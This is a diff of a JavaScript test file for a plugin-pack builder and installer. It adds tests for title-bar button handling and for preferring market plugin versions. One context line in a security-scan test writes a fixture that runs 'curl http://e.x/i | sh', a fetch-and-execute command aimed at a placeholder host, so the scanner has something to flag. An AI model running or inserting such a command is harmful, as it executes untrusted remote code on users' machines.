@@ -608,6 +608,22 @@ await testAsync('客户端组件在假 React 下能渲染（抓未定义变量�
   }
 })
 
+await testAsync('进度窗标题栏：按在按钮上不算拖动，也不会顺手展开/收起', async () => {
+  const source = fs.readFileSync(new URL('../client.js', import.meta.url), 'utf8')
+  // 拖拽起点要跳过按钮，否则 setPointerCapture 会把 click 抢走，按钮就点不到
+  assert(
+    source.includes('event.target.closest("button")'),
+    'startDrag 里应跳过按钮目标（event.target.closest("button")）',
+  )
+  const header = source.slice(source.indexOf('function JobDock'), source.indexOf('// —— 打包 ——'))
+  assert(header.includes('清空进程'), '标题栏应有「清空进程」')
+  assert(
+    (header.match(/onPointerDown: \(event\) => \{ if \(event && event\.stopPropagation\) event\.stopPropagation\(\) \}/g) || []).length >= 2,
+    '两个标题栏按钮都要在 pointerdown 上 stopPropagation',
+  )
+  assert(header.includes('flexShrink: 0'), '标题栏按钮别被挤扁，避免点不到')
+})
+
 await testAsync('确认后从检测点续跑：不重新收集、也不重复检测', async () => {
   const { profileDir, installed } = await fixture()
   fs.writeFileSync(path.join(installed[0].dir, 'lib', 'risky.js'), "require('child_process').execSync('curl http://e.x/i | sh')\n")
@@ -635,6 +651,65 @@ await testAsync('确认后从检测点续跑：不重新收集、也不重复检
   assertEqual(resumed.manifest.security.acknowledged, true)
   assertEqual(resumed.scan.counts.high, refused.scan.counts.high)
   assert(resumed.notes.some((n) => n.includes('不重复扫描')), '续跑时应该说明没再扫一遍')
+})
+
+await testAsync('安装：联网且市场有时优先按市场版本，关掉开关则用包内那份', async () => {
+  const { profileDir, installed } = await fixture()
+  const built = await buildPack({
+    selection: [{ name: 'demo-plugin', source: 'profile' }],
+    options: { includePayload: true, includeConfig: false, name: '市场优先包' },
+    context: packContext(baseConfig, profileDir, installed),
+  })
+  const inspected = inspectPackBuffer(built.buffer, { config: baseConfig })
+
+  const makeTarget = (label) => {
+    const home = tmpDir(label)
+    const target = path.join(home, 'profiles', 'desktop')
+    fs.mkdirSync(target, { recursive: true })
+    fs.writeFileSync(path.join(target, 'package.json'), JSON.stringify({
+      name: 'desktop', private: true, dependencies: {}, dsh: { profile: { bundles: [] } },
+    }, null, 2))
+    fs.writeFileSync(path.join(target, 'cordis.patch.yml'), '[]\n')
+    return target
+  }
+
+  // 1) 默认：市场查得到就按 name@version 装
+  const marketTarget = makeTarget('market-home')
+  const calls = []
+  const marketRun = await installPack({
+    manifest: inspected.manifest,
+    entries: inspected.entries,
+    config: baseConfig,
+    options: { force: true, applyConfig: false, keepLocal: false, enableBundles: false },
+    context: {
+      profileDir: marketTarget,
+      runCli: async (profile, args) => { calls.push(args[args.length - 1]); return { code: 0, output: 'fake' } },
+      resolveMarket: async (plugin) => ({ spec: plugin.name + '@9.9.9', version: '9.9.9' }),
+    },
+  })
+  assertEqual(marketRun.ok, true)
+  assertEqual(calls[calls.length - 1], 'demo-plugin@9.9.9', '应该按市场版本装，实际：' + calls[calls.length - 1])
+  const marketAction = marketRun.actions.find((a) => a.plugin === 'demo-plugin')
+  assertEqual(marketAction.source, 'market')
+
+  // 2) 关掉 preferMarket：即使市场可用也按包内那份装
+  const localTarget = makeTarget('local-home')
+  const localCalls = []
+  const localRun = await installPack({
+    manifest: inspected.manifest,
+    entries: inspected.entries,
+    config: baseConfig,
+    options: { force: true, applyConfig: false, keepLocal: false, enableBundles: false, preferMarket: false },
+    context: {
+      profileDir: localTarget,
+      runCli: async (profile, args) => { localCalls.push(args[args.length - 1]); return { code: 0, output: 'fake' } },
+      resolveMarket: async () => { throw new Error('不该被调用') },
+    },
+  })
+  assertEqual(localRun.ok, true)
+  assert(localCalls[localCalls.length - 1].startsWith('file:'), '应该按包内那份装，实际：' + localCalls[localCalls.length - 1])
+  const localAction = localRun.actions.find((a) => a.plugin === 'demo-plugin')
+  assertEqual(localAction.source, 'pack')
 })
 
 for (const [state, name, detail] of results) {
